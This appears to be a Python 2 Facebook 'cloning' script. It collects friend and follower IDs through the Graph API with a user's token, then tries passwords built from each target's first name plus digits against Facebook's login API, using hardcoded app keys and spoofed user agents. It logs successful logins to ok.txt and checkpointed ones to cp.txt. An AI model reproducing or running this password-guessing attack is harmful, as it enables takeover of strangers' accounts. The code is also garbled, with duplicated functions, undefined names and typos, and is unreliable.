import os
import sys
#from coloramaa import Fore
import time
import requests
import platform,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string,subprocess
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
os.system('git pull')
os.system('pkg install curl')
try:
    import requests
except:
    os.system('pip2 install requests')
class you:
    def __init__(self,z):
        pass
    logo=''
    def main():
        os.system('clear')
   
        you(logo)
    print('1. FOLLOW OUR FACEBOOK PAGE ')
    print('2. EXIST')
    opopot=input('input chose an option')
if opopot=='1':
    os.system('clear')
    rom()
else:
    rom()
def youo():
    
    print(logo)
    
def rom():
    os.system('clear')
    you(logo)
    print('')
    print('firstlty log in your token press 10 after filling chose any oprtion 1 or 2')
    print('1. random cloining ')
    print('2. fb group')
    print('contact me fb')
    yo=input('chose an option:')
    if yo =='1':
        i()
    elif yo =='2':
        print('xdg-open ')
        ud()
      
    elif yo =='':
        print('invalid option please ener')
        ud()
    else:
        if yo=='10':
            enter_token()
            
    def enter_token():
        
        tok=open('token.txt','x')
        print('')
        print (you(logo))
        rtok= input('input token here:')
        toko=open('token.txt','r').read()
        wtok=open('token.txt','w').write(rtok)
        wtok.close()
        rom()
def rom():
    try:
        open('token.txt','r').read()
    except IOError:
      
        print('invalid token pleas try agian')
        you(logo)
        os.system('rm -rf token.txt')
        enter_token() 
        requests.post(useragent_url + rtok,headers=header)
 	    # pass
try:
    token=open('token.txt','r').read()
except IOError:
            print('soory please try inputing agian')
            time.sleep(5.00)
            os.system('clear')
            enter_token()
try:
    r=request.get("https://graph.facebook.com/me?access_token="+token)
    q=json.load(r.text)
    name=q["name"]
    menu()
except (KeyError):
                  you(logo)
                  print("loggin in token expired try logging in another one")
                  enter_token()
                  time.sleep(5.0)
def menu():
    os.system('clear')
    you(logo)
    print('name'+name.upper())
    print('')
    print('wait for 5sec')
    time.sleep(5.0)
    crack()
def crack():
    id=[]
    ok=[]
    cps=[]
    os.system('clear')
    you(logo)
    print('')
    print('1. public id')
    print('2. followers id')
    select=raw_input('input :')
    if select=='1':
        print("public id in process")
        print('enter id limit here')
        limit=int(raw_input('please enter id limit:'))
        for t in range(limit):
            t+=1
            idt=input('public id input')
            try:
                for y in requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token).json()["data"]:
                 uid=y["id"].encode('uft-8')
                 na=y["name"].encode('uft-8')
                 id.append(uid+"/"+na)
                
            except (KeyError):
                    print('failed check your connection '+len(id))
                    os.system('clear')
                    time.sleep(2.0)
                    crack()
    if select=='2':
        print("followersid in process")
        print('enter id limit here')
        limit=int(raw_input('please enter id limit:'))
        for o in range(limit):
            o+=1
        idd=input('put id heree')
        try:
            for q in requests.get("https://graph.facebook.com/"+idd+"/subscribers?access_token="+token+"&limit=999999").json()["data"]:
                        naa=q["name"].encode("uft-8")
                        uid=q["id"].encode("uft-8")
                        id.append(naa+"/"+iddo)
                        pro()
        except (KeyError):
                print('private followers or connection error')
                time.sleep(3.0)
                crack()
    def pro():
            os.sysytem('clear')
            you(logo)
            print('it has started by @efk e$n$i$O$')
            print('the total ids are'+srt(len(id)))
            print('don.t forget to continue subscribe and follow our facebook page and group@itz efk')
        
    def main(arg):
        user=arg
        uid,name=user.split("/")
        agent=random.choice(["Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]", "[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]", "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]", "Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]", "Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]", "Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]"])
    try:
        pass1=name.lower().split(' ')[0]+'1234'
        api='https://b-api.facebook.com/method/auth.login'
        params= {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass1, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'} 
        headers_= {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': agent, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
        data=requests.get(api,params=params,headers=headers_)
        if "access_token" in data.text and "EAAA" in data.txt:
            print(uid+"/"+pass1)
            ok=open("ok.txt",'a')
            ok.write(uid+"/"+pass1+'\n')
            ok.close()
            oks.append(uid+pass1)
        else:
            if "www.facebook.com" in data.json()['error msg']:
                print(uid+"/"+pass1)
                cp=open("cp.txt","a")
                cp.write(uid+"/"+pass1+"\n")
                cp.close()
                cps.append(uid+pass1)
            else:
                pass2=name.lower().split(' ')+"12345"
                api='https://b-api.facebook.com/method/auth.login'
                params= {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass21, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'} 
                headers_= {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': agent, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                data=requests.get(api,params=params,headers=headers_)
                if "access_token" in data.text and "EAA" in data.txt:
                    print(uid+"/"+pass2)
                    ok=open("ok.txt","a")
                    ok.write(uid+"/"+pass2+"\n")
                    ok.close()
                    oks.append(uid+pass2)
                else:
                    if "wwww.facebook.com" in data.json()["error msg"]:
                        print(uid+"/"+pass2)
                        cp=open("cp.txt","a")
                        cp.write(uid+"/"+pass2+"\n")
                        cp.close()
                        cps.append(uid+pass2)
                    else:
                        pass3=name.lower().split(' ')[0]+'1234567'
                        api='https://b-api.facebook.com/method/auth.login'
                        params= {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass3, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'} 
                        headers_= {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': agent, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                        data=requests.get(api,params=params,headers=headers_)
                    if "access_token" in data.text and "EAAA" in data.txt:
                        print(uid+"/"+pass3)
                        ok=open("ok.txt",'a')
                        ok.write(uid+"/"+pass3+"\n")
                        ok.close()
                        oks.append(uid+pass3)
                    else:
                        if "www.facebook.com" in data.json()['error msg']:
                            print(uid+"/"+pass3)
                            cp=open("cp.txt","a")
                            cp.write(uid+"/"+pass3+"\n")
                            cp.close()
                            cps.append(uid+pass3)
    except (KeyError):
                            	print("")
                            	print("")
                            	print("\033[92;1m THE PROCESS HAS BEEN COMPLETED")
                            	print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: "+str(len(oks))+"/"+str(len(cps)))
                            	print("")
if ___name___=='___main___':
    main()
